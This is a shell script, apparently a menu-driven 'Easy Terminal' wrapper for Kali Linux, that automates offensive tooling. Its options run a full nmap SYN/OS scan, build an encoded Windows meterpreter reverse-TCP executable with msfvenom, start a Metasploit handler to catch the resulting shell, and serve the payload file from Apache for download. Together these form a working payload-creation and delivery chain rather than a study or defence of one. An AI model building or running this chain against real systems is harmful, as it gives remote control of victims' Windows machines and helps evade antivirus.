#!/bin/sh

print_menu() {
    echo $Blue2"========================================================================="
    figlet "Easy Terminal" | lolcat
    echo " [---] Welcome to Easy Terminal by: [---]"
    figlet "BO7MED MIX YT" | lolcat
    echo $Blue2"========================================================================="
    echo 
    echo $red "==============================" $red "=============================="
    echo $red "[1]. Start Nmap Scan          " $red "[2]. Create Payload           "
    echo $red "==============================" $red "=============================="
    echo $cyan "==============================" $cyan "=============================="
    echo $cyan "[3]. Create Metasploit Listener" $cyan"[4]. Start Nessus             "
    echo $cyan "==============================" $cyan "=============================="
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $yellow "=============================="  $yellow "=============================="
    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Files         "
    echo $yellow "=============================="  $yellow "=============================="
    echo $white "==============================" $white "=============================="
    echo $white "[9]. Update Script            " $white "[10]. Exit                    "
    echo $white "==============================" $white "=============================="
}

cyan='\e[0;36m'
Blue2='\e[0;34m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'

show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}

update_script() {
    script_dir="/home/kali/easy-terminal-script"
    repo_url="https://github.com/DevBO7MED/easy-terminal-script"

    echo "Updating repository in script directory $script_dir..."

    cd $script_dir

    git reset --hard HEAD
    git pull --force $repo_url main

    if [ $? -eq 0 ]; then
        echo "Files updated successfully!"
    else
        echo "Failed to update repository."
    fi

    echo "Press [ENTER] to return to the menu."
    read cont
    clear
}

progress_bar() {
    local progress=$1
    local total=100
    local width=50
    local filled=$((width * progress / total))
    local unfilled=$((width - filled))
    local bar=$(printf "%${filled}s" | tr ' ' '#')
    bar=$(printf "%-${width}s" "$bar")
    echo -ne "[${bar}] ${progress}%\r"
}

execute_option() {
    case $1 in
        1)  
            echo
            echo
            read -p "Enter Target IP or URL: " IP
            sudo nmap -sS -O -Pn -sV -p- $IP
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        2)  
            echo
            echo
            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " lhost
            echo
            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " lport
            echo
            read -p "Enter Payload save path (e.g., \"/home/kali\"): " payload_path
            echo
            read -p "Enter Payload name (e.g., \"Payload.exe\"): " N
            echo
            echo
            echo "Creating Payload..."
            echo
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path/$N
            clear
            print_menu
            echo
            echo "Payload created successfully!"
            echo
            echo "Payload Path: $payload_path/$N"
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        3)  
            sudo service postgresql start
            sudo msfdb init
            xterm -fa monaco -fs 13 -bg black -e "
                echo '========================================================================='
                echo 'IPv4 and IPv6 Addresses'
                echo '========================================================================='
                echo 'IPv4 Addresses:'
                ip -4 addr show | grep inet | awk '{print \$2}'
                echo ''
                echo 'IPv6 Addresses:'
                ip -6 addr show | grep inet6 | awk '{print \$2}'
                echo '========================================================================='
                echo 'Enter LHOST (Metasploit IP Address):'
                read LHOST
                echo 'Enter LPORT (Metasploit Port):'
                read LPORT
                echo 'Starting Metasploit with Listener...'
                msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
            " &
            ;;
        
        4)
            echo "Starting Nessus..."
            sudo systemctl start nessusd
            clear
            echo "Nessus started successfully. You can now access Nessus at { https://localhost:8834 }"
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        5)
            echo
            echo "Starting Apache2..."
            sudo service apache2 start
            echo
            read -p "Enter Source file location: " Source
            echo
            read -p "Enter file name: " Name
            echo
            sudo cp $Source /var/www/html/$Name
            echo
            echo "Open your browser and enter your IP address and file name (e.g., 192.168.1.4/Payload.exe)"
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        6)
            echo "Stopping Apache2..."
            sudo service apache2 stop
            echo "Stopped successfully"
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        7)
            echo "Updating system..."
            sudo apt update
            echo
            echo "Upgrading system..."
            echo 
            sudo apt upgrade
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        8)
            echo
            sudo apt autoremove
            echo
            echo "Old files removed successfully"
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        
        9)
            update_script
            ;;
        
        10)
            echo "Exiting..."
            exit 0
            ;;
        
        *)
            echo "Invalid option. Please try again."
            sleep 1
            ;;
    esac
}

while true; do
    clear
    print_menu
    echo
    echo $okegreen"┌─["$red"Easy Terminal$okegreen]──[$red~$okegreen]─["$yellow"Menu$okegreen]:"
    read -p "└─────► " choice
    execute_option $choice
done
